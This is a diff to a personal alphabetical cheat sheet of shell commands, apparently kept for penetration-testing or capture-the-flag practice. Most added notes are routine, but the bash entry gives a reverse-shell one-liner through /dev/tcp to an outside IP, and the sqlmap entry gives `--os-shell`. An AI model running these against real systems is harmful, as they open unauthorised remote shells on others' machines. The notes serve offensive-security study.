@@ -27,6 +27,11 @@ alias sayhi="echo hi"
 - Create shortcuts for (complex) commands
 ## B
 ```sh
+bash
+```
+- Simple but better shell than `sh`, commonly used
+- Use `bash -c "bash -i >& /dev/tcp/10.10.15.127/9090 0>&1"` for stable reverse shell
+```sh
 binwalk
 ```
 - Hiding files in files
@@ -91,6 +96,7 @@ free
 ftp
 ```
 - FTP connection on port 20,21
+- Use `ftp <host>` with username `anonymous` to login without password
 - SFTP is secure version
 ## G
 ```sh
@@ -282,7 +288,13 @@ su
 sudo
 ```
 - Super User DO
+- `-S` to read password from stdin
 - Do `-l` to view sudo permissions
+```sh
+sqlmap -u <url>
+```
+- Test for sql injection vulnerabilities on given url
+- Use `--os-shell` to get shell, if possible
 ## T
 ```sh
 tar -xvf (file)
@@ -312,11 +324,12 @@ unzip
 - Unzip a .zip file
 ## V
 ```sh
-vim
+vi
 ```
 - Very nice
-- Press `:shell` to get shell
+- Otherwise known as `vim`, `view`, I think it is the same
 - Can set variables with `:set shell=/bin/sh`
+- Press `:shell` to get shell
 ## X
 ```sh
 xxd
